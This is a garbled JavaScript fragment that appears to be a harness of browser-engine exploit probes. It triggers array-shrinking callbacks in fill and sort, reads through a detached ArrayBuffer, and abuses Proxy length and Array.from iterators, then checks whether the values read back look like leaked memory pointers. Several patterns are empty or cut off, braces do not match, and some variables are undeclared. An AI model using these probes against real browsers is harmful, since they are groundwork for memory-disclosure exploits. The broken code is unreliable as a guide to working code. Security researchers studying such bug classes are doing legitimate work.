/*

function ptrShaped(d, off){
  /* 8-byte LE window looks like a userland VA: b[7]==0, b[6]==0, b[5]<=0x7F, low nonzero */
  if(off+8>d.length) return false;
  if(d[off+7]!==0||d[off+6]!==0||d[off+5]>0x7F) return false;
  return (d[off]|d[off+1]|d[off+2]|d[off+3]|d[off+4]|d[off+5])!==0;
}
function hex8(d,off){var s='0x';for(var k=7;k>=0;k--)s+=('0'+(d[off+k]||0).toString(16)).slice(-2);return s;}
function f64bytes(v){var b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint8Array(b);f[0]=v;return u;}

var PATTERNS=[
 {n:'A-double-transition-race', run:function(bk){

 {n:'B-fill-valueof-shrink', run:function(bk){

   try{ arr.fill(2.5,evil); }catch(e){ bk('CLEAN','B threw: '+e.name); return; }
   var d=f64bytes(arr[10]||0);
   if(arr[10]!==undefined&&ptrShaped(d,0)) bk('FIRE','B: pointer-shaped at idx10: '+hex8(d,0));
   else if(arr[10]!==undefined&&arr[10]!==2.5&&arr[10]!==0) bk('WEIRD','B: idx10='+String(arr[10]).slice(0,40));
   else bk('CLEAN','B: idx10='+String(arr[10]).slice(0,40));
 }},
 {n:'C-sort-comparator-shrink', run:function(bk){
   var arr=[]; for(var i=0;i<256;i++)arr.push(i+0.5);
   var runs=0;
   arr.sort(function(a,b2){ runs++; if(runs===50){ arr.length=3; arr[0]={}; } return a-b2; });
   var out=arr[100];
   if(out!==undefined) bk('FIRE','C: idx100 survived shrink: '+String(typeof out)+':'+String(out).slice(0,40));
   else bk('CLEAN','C: idx100 undefined after shrink');
 }},
 {n:'D-f64-detach-midread', run:function(bk){
   var ab=new ArrayBuffer(1024); var f=new Float64Array(ab);
   for(var i=0;i<f.length;i++)f[i]=i*1.1;
   var victim={transfer:function(){ try{structuredTransfer(ab);}catch(e){ try{ postTransfer(ab); }catch(e2){} } function structuredTransfer(a){ /* structuredClone can't transfer directly; use MessageChannel */ } function postTransfer(a){} }};
   /* real detach path: postMessage transfer via MessageChannel */
   try{
     var mc=new MessageChannel();
     mc.port1.onmessage=function(){};
     mc.port2.postMessage(ab,[ab]);        /* detach */
     var v=f[10];                           /* read through detached view */
     var d=f64bytes(typeof v==='number'?v:0);
     if(v!==undefined&&ptrShaped(d,0)) bk('FIRE','D: detached read pointer-shaped: '+hex8(d,0));
     else bk('CLEAN','D: detached read val='+String(v).slice(0,40));
   }catch(e){ bk('CLEAN','D threw: '+e.name); }
 }},
 {n:'E-proxy-length-slice', run:function(bk){
   var arr=[1.1,2.2,3.3];
   var p=new Proxy(arr,{get:function(t,k){ if(k==='length'){ t.length=1; return 100; } return t[k]; }});
   for(var w=0;w<100;w++){ try{ [1.1,2.2,3.3].slice(0); }catch(e){} }
   var out=p.slice(0);
   var found=null;
   for(var i=0;i<out.length;i++){ if(typeof out[i]==='object'&&out[i]!==null){ found=out[i]; } }
   if(found) bk('FIRE','E: object through sliced stale view');
   else bk('CLEAN','E: slice len='+out.length);
 }},
 {n:'F-spread-arguments', run:function(bk){
   function f(){ var a=[...arguments]; return a; }
   var out=null;
   for(var w=0;w<200;w++){
     var a1=[1.1,2.2,3.3];
     var args={length:3, 0:1.1, 1:2.2, 2:3.3, __proto__:null};

   }

 }},
 {n:'G-arrayfrom-transition', run:function(bk){
   var src={length:4, 0:1.1, 1:2.2, 2:3.3, 3:4.4};

   var it={ [Symbol.iterator]:function(){ var i=0; return { next:function(){ calls++; if(calls===2){ src[2]={evil:1}; src.length=2; } return i<4?{done:false,value:src[i++]}:{done:true}; } }; } };
   var out=Array.from(it);

var st={p:0,pending:null};
